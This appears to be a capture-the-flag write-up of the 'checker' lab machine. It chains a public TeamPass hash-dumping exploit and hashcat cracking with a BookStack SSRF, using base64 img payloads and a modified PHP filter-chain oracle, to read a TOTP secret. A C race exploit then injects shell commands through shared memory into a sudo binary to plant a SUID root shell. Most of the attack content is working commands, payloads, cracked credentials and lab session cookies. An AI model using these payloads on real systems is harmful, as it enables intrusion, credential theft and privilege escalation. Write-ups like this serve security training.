---
layout: post
title: "checker"
date: 2025-08-29 
categories: ctf
---
# checker

First, let’s enumerate the open ports and services:

```bash
sudo nmap -sC -sV 10.10.11.56 -oN nmap/checker

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 aa:54:07:41:98:b8:11:b0:78:45:f1:ca:8c:5a:94:2e (ECDSA)
|_  256 8f:2b:f3:22:1e:74:3b:ee:8b:40:17:6c:6c:b1:93:9c (ED25519)
80/tcp   open  http    Apache httpd
|_http-title: 403 Forbidden
|_http-server-header: Apache
8080/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: 403 Forbidden
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let’s visit the web page.

```bash
Uknown host: checker.htb
```

Let’s add that to /etc/hosts

![image.png]({{ site.baseurl }}/assets/checker/image.png)

We have a bookstack application. Let’s do some research on that and also search for default credenitals. While we are doing that, let’s fuzz for subdomains and also sub directories:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://checker.htb/FUZZ -fs 199

ffuf -u http://10.129.193.238 -H "Host: FUZZ.checker.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 116

```

![image.png]({{ site.baseurl }}/assets/checker/image%201.png)

```bash
admin@admin@:password

admin@admin@:admin
```

Let’s also look at the page source trying to determine the version

Potentially:

```bash
<link rel="stylesheet" href="http://checker.htb/dist/styles.css?version=v23.10.2">

<SNIP>
 <script src="http://checker.htb/dist/app.js?version=v23.10.2" nonce="0feRsAWjtjCwaXVx9OMYKWli"></script>
```

We found a vulnerability associated with that version: https://fluidattacks.com/advisories/imagination from either searching directly from Google: Book Stack v23.10.2 exploit, or going to cvedetails and search for book stack and find the relevant version.

However, we need at least a user account which we don’t have. Let’s move on for now and visit port 8080.

![image.png]({{ site.baseurl }}/assets/checker/image%202.png)

We have a teampass application. After research, there is no default login. There is a github page: https://github.com/nilsteampassnet/TeamPass

Page source does not reveal version. The github page shows that there is a changelog.txt which normally specify the version of the application. Let’s check:

```bash
http://checker.htb:8080/changelog.txt
```

![image.png]({{ site.baseurl }}/assets/checker/image%203.png)

The copyright implies that the latest version it can be is early 2023. Let’s look for exploit around that time.

We find this: https://www.exploit-db.com/exploits/52094

Let’s download the exploit. To learn how to use it, scroll down to main:

```bash
def main():
    if len(sys.argv) < 2:
        logger.error("Usage: python3 script.py <base-url>")
        sys.exit(1)
```

```bash
python3 52094.py http://checker.htb:8080                           

2025-08-29 10:35:51,769 - INFO - Encontrados 2 usuários no sistema
2025-08-29 10:35:52,082 - INFO - Credenciais obtidas para: admin
2025-08-29 10:35:52,401 - INFO - Credenciais obtidas para: bob

Credenciais encontradas:
admin: $2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya
bob: $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy

```

We got two bcrypt hashes. Let’s attempt to crack it, remove the space after the username:

```bash
.\hashcat.exe -m 3200 --username wordlists\admin_hash.txt wordlists\rockyou.txt
.\hashcat.exe -m 3200 --username wordlists\admin_hash.txt --show

bob:$2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy:cheerleader
```

We now have a valid user. Let’s log on. We see two passwords:

![image.png]({{ site.baseurl }}/assets/checker/image%204.png)

![image.png]({{ site.baseurl }}/assets/checker/image%205.png)

```bash
ssh access:
reader:hiccup-publicly-genesis

bookstack:
bob@checker.htb:mYSeCr3T_w1kI_P4sSw0rD
```

Let’s also see if we can ssh in as bob:

```bash
ssh reader@10.10.11.56

(reader@10.10.11.56) Verification code: 

#Seem to be MFA
```

Let’s log on to book stack.

![image.png]({{ site.baseurl }}/assets/checker/image%206.png)

![image.png]({{ site.baseurl }}/assets/checker/image%207.png)

Going back to this exploit:  https://fluidattacks.com/advisories/imagination

Server-Side Request Forgery (SSRF) is a security vulnerability that allows an attacker to manipulate a server into making unintended HTTP requests to internal or external resources. This happens when a web application accepts user input to construct URLs for server-side requests without proper validation or sanitization. The attacker can exploit this to access internal systems, sensitive data, or external services that the server can reach but the attacker cannot directly access.

We can create a book and get book stack to interact with a remote server. To test it out, first we have to encode our payload of our malicious server:

```bash
http://10.10.16.2:8001/TESTING

echo -n "http://10.10.16.2:8001/TESTING" | base64

aHR0cDovLzEwLjEwLjE2LjI6ODAwMS9URVNUSU5H
```

Now let’s create a new book and capture the request on burp intercept:

![image.png]({{ site.baseurl }}/assets/checker/image%208.png)

![image.png]({{ site.baseurl }}/assets/checker/image%209.png)

Save the book and Create a new page:

![image.png]({{ site.baseurl }}/assets/checker/image%2010.png)

And now turn intercept on before clicking save draft after editing draft:

![image.png]({{ site.baseurl }}/assets/checker/image%2011.png)

![image.png]({{ site.baseurl }}/assets/checker/image%2012.png)

In the html part, we enter our payload:

```bash
<img src='data:image/png;base64,[BASE64 HERE]'/>

echo -n "http://10.10.16.2:8001/TESTING" | base64

<img src='data:image/png;base64,aHR0cDovLzEwLjEwLjE2LjI6ODAwMS9URVNUSU5H'/>
```

And we start our listener:

```bash
nc -lnvp 8001

connect to [10.10.16.2] from (UNKNOWN) [10.10.11.56] 51216
GET /TESTING HTTP/1.1
Host: 10.10.16.2:8001
Connection: close
Accept-language: en
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36

```

It’s working. 

![image.png]({{ site.baseurl }}/assets/checker/image%2013.png)

However, we still can’t see the content of the resource we requested e.g.:

```bash
echo -n "http://10.10.16.2:8001/test.txt" | base64
aHR0cDovLzEwLjEwLjE2LjI6ODAwMS90ZXN0LnR4dA==

python3 -m http.server 8001
```

![image.png]({{ site.baseurl }}/assets/checker/image%2014.png)

We can’t get the content. One way around this is to use file read from error-based oracle with php filter chains

https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle

[https://github.com/synacktiv/php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit)

First we clone the repo:

```bash
git clone https://github.com/synacktiv/php_filter_chains_oracle_exploit.git
```

Now we need to change filters_chain_oracle/core/requestor.py in the github repo, in the req_with_response:

```bash
from base64 import b64encode  #ADD THIS LINE

    def req_with_response(self, s):
        if self.delay > 0:
            time.sleep(self.delay)

        filter_chain = f'php://filter/{s}{self.in_chain}/resource={self.file_to_leak}'
        # DEBUG print(filter_chain)
        #WE ADD OUR PAYLOAD HERE ON THE NEXT LINE ---------------:
        filter_chain = f"<img src='data:image/png;base64,{b64encode(filter_chain.encode()).decode()}'/>"  #WE WANT OUR OUTPUT TO BE ASCII
        merged_data = self.parse_parameter(filter_chain)
        # Make the request, the verb and data encoding is defined
```

Now let’s change the request so we don’t have to send JSON data, simplifying the process:

```bash
PUT /ajax/page/8/save-draft HTTP/1.1
Host: checker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://checker.htb/books/new/draft/8
Content-Type: application/x-www-form-urlencoded     #CHANGED THIS
X-Requested-With: XMLHttpRequest
baseURL: http://checker.htb/
X-CSRF-TOKEN: UMS9LQo5W7c2BjScWscdjNA5gr253ibVbd47ZmW7
Content-Length: 29
Origin: http://checker.htb
Connection: keep-alive
Cookie: teampass_session=2bnuqpnk5qtuunqker5u8m9q47; jstree_select=1; bookstack_session=eyJpdiI6InJMZERyVHV5WlZES0ExVWZRYWJScmc9PSIsInZhbHVlIjoiaTdkbm5qVEFiU3gzQTlGcm12Q3ZJYUd2WVowbm85dlhRMndGMElDUS9CWUNaaG9EdUlFaFJaN0Y4Zkh5Si8rMm9PdHFMNmRtYmFDeW54YnI2UkRzcUhCUTBiMzMrUlE2WC84VzlNKzYrcUE5WjA4b1JQYS8vUUxzQ0NiS2x6bnAiLCJtYWMiOiJkMThjMzcwMmRmZTY3ODdkMTQzYjJiMzBhY2IzNmJjMGU2NWZkMzI3YTkzMDBmMTZjYjBiYzY1YjYzNjhlMWFlIiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6InV2RFdWWDVMYUpiSTJnNWVob241dkE9PSIsInZhbHVlIjoibWtOZVlXR1R3OGdHdXA1d1BtRXFKQk5PaDY5S05lVGN5dDdKckFuTDY1RVRHRUpTNU1Pc29mbmZJVFVSU213SXNMbFhyYVpjQmJCeTJZc0RxQ1h4RldJSXlWYWswVFBGVjFseU1mVmNXTHh1aEVjc1l4cXJmQlp6eEJ0d0k2emwiLCJtYWMiOiJlYzU0ODBiOTNmMjMwODBkMjI4MTlmNzVkMmMzMTg5MDQ4OWNjODY4ZTViZGJlZWZkZGUyMjhkNzQxNjljYTAzIiwidGFnIjoiIn0%3D; remember_standard_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6IjAyc1FMOVJvYWRMeWI2U1pNaEQrMFE9PSIsInZhbHVlIjoidjNlcGtYYnRWRzliUFFMZmYrN1hzazVnSlpKc2hwbTYxQldQbnlUK0wxRlE5T3BaRWYvcUV0NjM2RUxScWlvaEl1QXNucGNZSTZpdFUvS1BUVlYyeGZsQWZ2WUNkM1JHUE9KR216UEsrdnVUWU5seGIvUUtKdHF3b3BDVXcvV2RpMzI3RmtzYi92akxIYVd3NXFCd3VjTURheHFoU2tsNkt6czYxbkQ4Vyt2RkU1WFRycG1aVlF6cWRJL0xsY1FZa09UT3ZJK2pHdk1TajlpUmVoRjh2Q1BHQk1PMm5hcHMzNXd6OEtFN1podz0iLCJtYWMiOiI1ZTJlNDc0OWIyYTA2NTY3YmM2ZWRmNmM3ODM4NTkyZDJmNTI2MmJiMzc5MGU1MTE2M2I5NDJiMmUwMTY2MzQ2IiwidGFnIjoiIn0%3D
Priority: u=0

html=<img src='data:image/png;base64,aHR0cDovLzEwLjEwLjE2LjI6ODAwMS9URVNUSU5H'/>  #CHANGED THIS
```

```bash
response:
listening on [any] 8001 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.56] 60750
GET /TESTING HTTP/1.1
Host: 10.10.16.2:8001
Connection: close
Accept-language: en
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36

```

It works. Now let’s try out our exploit. Let’s get it to read something easy first like /etc/hostname. Copy the request from the burp request above. Also let’s route it back to our burp:

```bash
python3 filters_chain_oracle_exploit.py --target http://checker.htb/ajax/page/8/save-draft --verb PUT --parameter html --headers '{"Cookie": "teampass_session=2bnuqpnk5qtuunqker5u8m9q47; jstree_select=1; bookstack_session=eyJpdiI6InJMZERyVHV5WlZES0ExVWZRYWJScmc9PSIsInZhbHVlIjoiaTdkbm5qVEFiU3gzQTlGcm12Q3ZJYUd2WVowbm85dlhRMndGMElDUS9CWUNaaG9EdUlFaFJaN0Y4Zkh5Si8rMm9PdHFMNmRtYmFDeW54YnI2UkRzcUhCUTBiMzMrUlE2WC84VzlNKzYrcUE5WjA4b1JQYS8vUUxzQ0NiS2x6bnAiLCJtYWMiOiJkMThjMzcwMmRmZTY3ODdkMTQzYjJiMzBhY2IzNmJjMGU2NWZkMzI3YTkzMDBmMTZjYjBiYzY1YjYzNjhlMWFlIiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6InV2RFdWWDVMYUpiSTJnNWVob241dkE9PSIsInZhbHVlIjoibWtOZVlXR1R3OGdHdXA1d1BtRXFKQk5PaDY5S05lVGN5dDdKckFuTDY1RVRHRUpTNU1Pc29mbmZJVFVSU213SXNMbFhyYVpjQmJCeTJZc0RxQ1h4RldJSXlWYWswVFBGVjFseU1mVmNXTHh1aEVjc1l4cXJmQlp6eEJ0d0k2emwiLCJtYWMiOiJlYzU0ODBiOTNmMjMwODBkMjI4MTlmNzVkMmMzMTg5MDQ4OWNjODY4ZTViZGJlZWZkZGUyMjhkNzQxNjljYTAzIiwidGFnIjoiIn0%3D; remember_standard_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6IjAyc1FMOVJvYWRMeWI2U1pNaEQrMFE9PSIsInZhbHVlIjoidjNlcGtYYnRWRzliUFFMZmYrN1hzazVnSlpKc2hwbTYxQldQbnlUK0wxRlE5T3BaRWYvcUV0NjM2RUxScWlvaEl1QXNucGNZSTZpdFUvS1BUVlYyeGZsQWZ2WUNkM1JHUE9KR216UEsrdnVUWU5seGIvUUtKdHF3b3BDVXcvV2RpMzI3RmtzYi92akxIYVd3NXFCd3VjTURheHFoU2tsNkt6czYxbkQ4Vyt2RkU1WFRycG1aVlF6cWRJL0xsY1FZa09UT3ZJK2pHdk1TajlpUmVoRjh2Q1BHQk1PMm5hcHMzNXd6OEtFN1podz0iLCJtYWMiOiI1ZTJlNDc0OWIyYTA2NTY3YmM2ZWRmNmM3ODM4NTkyZDJmNTI2MmJiMzc5MGU1MTE2M2I5NDJiMmUwMTY2MzQ2IiwidGFnIjoiIn0%3D","X-CSRF-TOKEN":"UMS9LQo5W7c2BjScWscdjNA5gr253ibVbd47ZmW7"}' --proxy http://localhost:8082 --file /etc/hostname

[+] File /etc/hostname leak is finished!
Y2hlY2tl
b'checke'

```

Looks like it’s working. Now the default location for MFA for ssh is /home/reader/.google_authenticator. However attempting this path fails. 

```bash
python3 filters_chain_oracle_exploit.py --target http://checker.htb/ajax/page/8/save-draft --verb PUT --parameter html --headers '{"Cookie": "teampass_session=2bnuqpnk5qtuunqker5u8m9q47; jstree_select=1; bookstack_session=eyJpdiI6InJMZERyVHV5WlZES0ExVWZRYWJScmc9PSIsInZhbHVlIjoiaTdkbm5qVEFiU3gzQTlGcm12Q3ZJYUd2WVowbm85dlhRMndGMElDUS9CWUNaaG9EdUlFaFJaN0Y4Zkh5Si8rMm9PdHFMNmRtYmFDeW54YnI2UkRzcUhCUTBiMzMrUlE2WC84VzlNKzYrcUE5WjA4b1JQYS8vUUxzQ0NiS2x6bnAiLCJtYWMiOiJkMThjMzcwMmRmZTY3ODdkMTQzYjJiMzBhY2IzNmJjMGU2NWZkMzI3YTkzMDBmMTZjYjBiYzY1YjYzNjhlMWFlIiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6InV2RFdWWDVMYUpiSTJnNWVob241dkE9PSIsInZhbHVlIjoibWtOZVlXR1R3OGdHdXA1d1BtRXFKQk5PaDY5S05lVGN5dDdKckFuTDY1RVRHRUpTNU1Pc29mbmZJVFVSU213SXNMbFhyYVpjQmJCeTJZc0RxQ1h4RldJSXlWYWswVFBGVjFseU1mVmNXTHh1aEVjc1l4cXJmQlp6eEJ0d0k2emwiLCJtYWMiOiJlYzU0ODBiOTNmMjMwODBkMjI4MTlmNzVkMmMzMTg5MDQ4OWNjODY4ZTViZGJlZWZkZGUyMjhkNzQxNjljYTAzIiwidGFnIjoiIn0%3D; remember_standard_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6IjAyc1FMOVJvYWRMeWI2U1pNaEQrMFE9PSIsInZhbHVlIjoidjNlcGtYYnRWRzliUFFMZmYrN1hzazVnSlpKc2hwbTYxQldQbnlUK0wxRlE5T3BaRWYvcUV0NjM2RUxScWlvaEl1QXNucGNZSTZpdFUvS1BUVlYyeGZsQWZ2WUNkM1JHUE9KR216UEsrdnVUWU5seGIvUUtKdHF3b3BDVXcvV2RpMzI3RmtzYi92akxIYVd3NXFCd3VjTURheHFoU2tsNkt6czYxbkQ4Vyt2RkU1WFRycG1aVlF6cWRJL0xsY1FZa09UT3ZJK2pHdk1TajlpUmVoRjh2Q1BHQk1PMm5hcHMzNXd6OEtFN1podz0iLCJtYWMiOiI1ZTJlNDc0OWIyYTA2NTY3YmM2ZWRmNmM3ODM4NTkyZDJmNTI2MmJiMzc5MGU1MTE2M2I5NDJiMmUwMTY2MzQ2IiwidGFnIjoiIn0%3D","X-CSRF-TOKEN":"UMS9LQo5W7c2BjScWscdjNA5gr253ibVbd47ZmW7"}' --proxy http://localhost:8082 --file /home/reader/.google_authenticator
```

Scouring around the Book Stack we find a secure copy instruction:

![image.png]({{ site.baseurl }}/assets/checker/image%2015.png)

Maybe the /backup/home_backup dir:

```bash
python3 filters_chain_oracle_exploit.py --target http://checker.htb/ajax/page/8/save-draft --verb PUT --parameter html --headers '{"Cookie": "teampass_session=2bnuqpnk5qtuunqker5u8m9q47; jstree_select=1; bookstack_session=eyJpdiI6InJMZERyVHV5WlZES0ExVWZRYWJScmc9PSIsInZhbHVlIjoiaTdkbm5qVEFiU3gzQTlGcm12Q3ZJYUd2WVowbm85dlhRMndGMElDUS9CWUNaaG9EdUlFaFJaN0Y4Zkh5Si8rMm9PdHFMNmRtYmFDeW54YnI2UkRzcUhCUTBiMzMrUlE2WC84VzlNKzYrcUE5WjA4b1JQYS8vUUxzQ0NiS2x6bnAiLCJtYWMiOiJkMThjMzcwMmRmZTY3ODdkMTQzYjJiMzBhY2IzNmJjMGU2NWZkMzI3YTkzMDBmMTZjYjBiYzY1YjYzNjhlMWFlIiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6InV2RFdWWDVMYUpiSTJnNWVob241dkE9PSIsInZhbHVlIjoibWtOZVlXR1R3OGdHdXA1d1BtRXFKQk5PaDY5S05lVGN5dDdKckFuTDY1RVRHRUpTNU1Pc29mbmZJVFVSU213SXNMbFhyYVpjQmJCeTJZc0RxQ1h4RldJSXlWYWswVFBGVjFseU1mVmNXTHh1aEVjc1l4cXJmQlp6eEJ0d0k2emwiLCJtYWMiOiJlYzU0ODBiOTNmMjMwODBkMjI4MTlmNzVkMmMzMTg5MDQ4OWNjODY4ZTViZGJlZWZkZGUyMjhkNzQxNjljYTAzIiwidGFnIjoiIn0%3D; remember_standard_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6IjAyc1FMOVJvYWRMeWI2U1pNaEQrMFE9PSIsInZhbHVlIjoidjNlcGtYYnRWRzliUFFMZmYrN1hzazVnSlpKc2hwbTYxQldQbnlUK0wxRlE5T3BaRWYvcUV0NjM2RUxScWlvaEl1QXNucGNZSTZpdFUvS1BUVlYyeGZsQWZ2WUNkM1JHUE9KR216UEsrdnVUWU5seGIvUUtKdHF3b3BDVXcvV2RpMzI3RmtzYi92akxIYVd3NXFCd3VjTURheHFoU2tsNkt6czYxbkQ4Vyt2RkU1WFRycG1aVlF6cWRJL0xsY1FZa09UT3ZJK2pHdk1TajlpUmVoRjh2Q1BHQk1PMm5hcHMzNXd6OEtFN1podz0iLCJtYWMiOiI1ZTJlNDc0OWIyYTA2NTY3YmM2ZWRmNmM3ODM4NTkyZDJmNTI2MmJiMzc5MGU1MTE2M2I5NDJiMmUwMTY2MzQ2IiwidGFnIjoiIn0%3D","X-CSRF-TOKEN":"UMS9LQo5W7c2BjScWscdjNA5gr253ibVbd47ZmW7"}' --proxy http://localhost:8082 --file /backup/home_backup/home/reader/.google_authenticator

b'DVDBRAODLCWF7I2ONA4K5LQLUE\n" TOTP_AUTH\n'
```

Success! Now we can use oathtool to decode to get the MFA code

```bash
oathtool --totp -b DVDBRAODLCWF7I2ONA4K5LQLUE

297034
```

Let’s try to ssh in now:

```bash
ssh reader@10.10.11.56 #hiccup-publicly-genesis
```

However, our time is not in sync. So let’s sync our time:

```bash
date -d "$(curl -s -I http://checker.htb | grep Date | cut -d ' ' -f 3-)" "+%Y-%m-%d %H:%M:%S"

oathtool --totp -b DVDBRAODLCWF7I2ONA4K5LQLUE --now="$(date -d "$(curl -s -I http://checker.htb | grep Date | cut -d ' ' -f 3-)" "+%Y-%m-%d %H:%M:%S")"
```

We are in:

![image.png]({{ site.baseurl }}/assets/checker/image%2016.png)

Now let’s enumerate. Checking our sudo privileges, we find: 

```bash
User reader may run the following commands on checker:
    (ALL) NOPASSWD: /opt/hash-checker/check-leak.sh *
```

Let’s see what [check-leak.sh](http://check-leak.sh) do:

```bash
#!/bin/bash
source `dirname $0`/.env
USER_NAME=$(/usr/bin/echo "$1" | /usr/bin/tr -dc '[:alnum:]')
/opt/hash-checker/check_leak "$USER_NAME"
```

What this script does is:

1. Loads environment variables from a `.env` file in its directory.
2. Takes a username you give it as input (`./script.sh someuser`).
3. Strips out anything that isn’t a letter or number.
4. Runs `/opt/hash-checker/check_leak` with that sanitized username.

The .env file is in the /opt/hash-checker dir, but we do not have permission to read it:

```bash
reader@checker:~$ cd /opt/hash-checker/
reader@checker:/opt/hash-checker$ ls
check-leak.sh  check_leak  cleanup.sh  leaked_hashes.txt
reader@checker:/opt/hash-checker$ ls -al
total 68
drwxr-xr-x 2 root root  4096 Jan 30  2025 .
drwxr-xr-x 5 root root  4096 Jan 30  2025 ..
-r-------- 1 root root   118 Jan 30  2025 .env
-rwxr--r-- 1 root root   141 Jan 30  2025 check-leak.sh
-rwxr--r-- 1 root root 42376 Jan 30  2025 check_leak
-rwx------ 1 root root   750 Jan 30  2025 cleanup.sh
-rw-r--r-- 1 root root  1464 Jan 30  2025 leaked_hashes.txt
reader@checker:/opt/hash-checker$ cat leaked_hashes.txt 
$2b$10$rbzaxiT.zUi.e28wm2ja8OGx.jNamreNFQC6Kh/LeHufCmduH8lvy
$2b$10$Tkd9LwWOOzR.DWdzj9aSp.Bh.zQnxZahKel4xMjxLIHzdostFVqsK
$2b$10$a/lpwbKF6pyAWeGHCVARz.JOi3xtNzGK..GZON/cFhNi1eyMi4UIC
$2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy
$2b$10$DanymKXfnu1ZTrRh3JwBhuPsmjgOEBJLNEEmLPAAIfG9kiOI28fIC
$2b$10$/GwrAIQczda3O5.rnGb4IOqEE/JMU4TIcy95ECSh/pZBQzhlWITQ.
$2b$10$Ef6TBE9GdSsjUPwjm0NYlurGfVO/GdtaCsWBpVRPnQsCbYgf4oU8a
$2b$10$/KLwuhoXHfyKpq1qj8BDcuzNyhR0h0g27jl0yiX7BpBL9kO.wFWii
$2b$10$Ito9FRIN9DgMHWn20Zgfa.yKKlJ.HedScxyvymCxMYTWaZANHIzvO
$2b$10$J025XtUSjTm.kUfa19.6geInkfiISIjkr7unHxT4V/XDIl.2LYrZ2
$2b$10$g962m7.wovzDRPI/4l0GEOviIs2WUPBqlkPgVAPfsYpa138dd9aYK
$2b$10$keolOsecWXEyDIN/zDPVbuc/UOjGjnZGblpdBPQAfZDVm2fRIDUCq
$2b$10$y2Toog209OyRWk6z7S7XNOAkVBijv3HwNBpKk.R1bPCYuR8WxrL66
$2b$10$O4OQizv0TVsWxWi26tg8Xu3SCS29ZEv9JqwlY5ED240qW8V0eyG7a
$2b$10$/1ePaOFZrcpNHWFk72ZNpepXRvXIi1zMSBYBGGqxfUlxw/JiQQvCG
$2b$10$/0az8KLoanuz3rfiN.Ck9./Mt6IHxs5OGtKbgM31Z0NH9maz1hPDe
$2b$10$VGR3JK.E0Cc3OnY9FuB.u.qmwFBBRCrRLAvUlPnO5QW5SpD1tEeDO
$2b$10$9p/iOwsybwutYoL3xc5jaeCmYu7sffW/oDq3mpCUf4NSZtq2CXPYC
$2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy
$2b$10$8cXny33Ok0hbi2IY46gjJerQkEgKj.x1JJ6/orCvYdif07/tD8dUK
$2b$10$QAcqcdyu1T1qcpM4ZQeM6uJ3dXw2eqT/lUUGZvNXzhYqcEEuwHrvS
$2b$10$M1VMeJrjgaIbz2g2TCm/ou2srr4cd3c18gxLA32NhvpXwxo3P5DZW
$2b$10$rxp3yM98.NcbD3NeHLjGUujzIEWYJ5kiSynHOHo0JvUvXq6cBLuRO
$2b$10$ZOUUTIj7JoIMwoKsXVOsdOkTzKgHngBCqkt.ASKf78NUwfeIB4glK
```

We can use ghidra to decompile the binary code and see what it’s actually doing. First transfer the file back to our attack box:

```bash
#on target
python3 -m http.server 8000

#on attack
wget http://10.10.11.56:8000/check_leak
```

From Ghidra, we go into main and read the decompiled code.

From Ghidra snippets we can reconstruct the control flow:

1. **Inputs & config**
    - `getenv("DB_*")` → pulls DB creds from the environment (set by the wrapper’s `source .env`).
    - `username = argv[1]`, `strlen(username) <= 20`.
2. **Lookup & decision**
    - `user_hash = fetch_hash_from_db(...)`
    - `check_bcrypt_in_file("/opt/hash-checker/leaked_hashes.txt", user_hash)`
    - If leaked:
        - `write_to_shm(user_hash)` → returns shared memory “key”/id and **writes a log line that includes the hash**
        - `fflush(stdout); sleep(1);` (**deliberate 1s gap**)
        - `notify_user(..., shared_memory)` → **reads from that shared memory**, extracts the bcrypt string, and builds a shell command that runs `mysql -e 'select ... "HASH"'`
        - `clear_shared_memory(...)`
3. **What matters**
    - **There’s a 1-second window between write and read**, and the read trusts whatever is in the shared memory.
    - **The later shell command is built with `system()`** and the hash is interpolated without safe quoting.

This means: even though the wrapper **sanitizes the username**, the **binary** later **trusts shared memory contents** and **injects them into a shell command** — that’s the real bug.

```bash
time_t current_time = time(0);
srand((uint)current_time);
int random_number = rand();
int shared_memory_identifier = shmget(random_number % 0xfffff, 0x400, 0x3b6);
```

- **Key generation**: `rand()` seeded with `time(0)` (seconds) → **predictable** if you know the second.
- **Key space**: `% 0xfffff` → 20-bit space, but you don’t need to brute force; you just **replicate the same seed and first `rand()` call** to get the same key immediately.
- **Flags**: `0x3b6` in hex = **octal 01666** → `IPC_CREAT | 0666`
    - `IPC_CREAT` (01000) → create if missing
    - `0666` → **world-read/write** (any process can attach and modify)

Now write the following exploit.c on the target:

```bash
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <sys/shm.h>
 
int main(int argc, char **argv) {
        srand(time(0));
        system("sudo /opt/hash-checker/check-leak.sh bob &");
        sleep(1);
 
        int shared_memory_identifier = shmget(rand() % 0xfffff,0x400,0x3b6);
        char *shared_memory_address = (char *)shmat(shared_memory_identifier,0,0);
        snprintf(shared_memory_address,0x400,"Leaked hash detected at > abc\"'; %s #", argv[1]);
        shmdt(shared_memory_address);
}
```

Compile it:

```bash
gcc -o exploit exploit.c
```

Now, let’s create a SUID bash:

```bash
./exploit 'cp /bin/bash /tmp/bash; chmod u+s /tmp/bash'
```

Now check the /tmp dir:

```bash
ls -l /tmp/bash

-rwsr-xr-x 1 root root 1396520 Aug 29 14:47 /tmp/bash

```

We see SUID is set. Now run it in privileged mode:

```bash
/tmp/bash -p

whoami

root

```

We now have root.